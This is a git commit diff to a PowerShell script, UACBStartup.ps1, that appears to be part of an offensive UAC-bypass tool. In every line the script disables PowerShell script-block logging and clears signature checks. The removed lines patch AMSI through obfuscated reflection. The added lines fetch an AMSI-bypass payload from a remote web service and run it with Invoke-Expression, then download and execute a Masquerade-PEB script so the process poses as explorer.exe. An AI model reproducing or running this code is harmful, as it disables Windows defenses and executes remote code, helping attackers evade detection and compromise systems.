fda5cc59074e98badb554c7dd067f943e6576912
GєṭRєҡṭBȏʏ724/ <virusleader324@gmail.com>
2021-03-01 14:28:49 +0700

    Add files via upload

--- UACBStartup.ps1
+++ UACBStartup.ps1
@@ -3,7 +3,10 @@ $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
 $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
 $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
 [ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
-[Ref].Assembly.GetType($([sYSTEM.Net.WebuTILITy]::HTmldECODE('&#83;&#121;&#115;&#116;&#101;&#109;&#46;&#77;&#97;&#110;&#97;&#103;&#101;&#109;&#101;&#110;&#116;&#46;&#65;&#117;&#116;&#111;&#109;&#97;&#116;&#105;&#111;&#110;&#46;&#65;&#109;&#115;&#105;&#85;&#116;&#105;&#108;&#115;'))).GetField(''+$([sYstEm.net.webutilIty]::hTMldECOde('&#97;&#109;&#115;&#105;'))+'InitFailed','NonPublic,Static').SetValue($null,$true);
-Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Masquerade-PEB.ps1');
-Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
-Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
+$accessAMBY = Invoke-WebRequest https://amsi-fail.azurewebsites.net/api/Generate 
+$parseAMBY = ($accessAMBY -split '\r?\n').Trim()
+$AMBY = $parseAMBY[1..($parseAMBY.Length-1)]
+Invoke-Expression $AMBY
+Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GetRektBoy724/sementara/master/Masquerade-PEB.ps1');
+MPEB -BinPath "C:\Windows\explorer.exe"
+MPEB -BinPath "C:\Windows\explorer.exe"
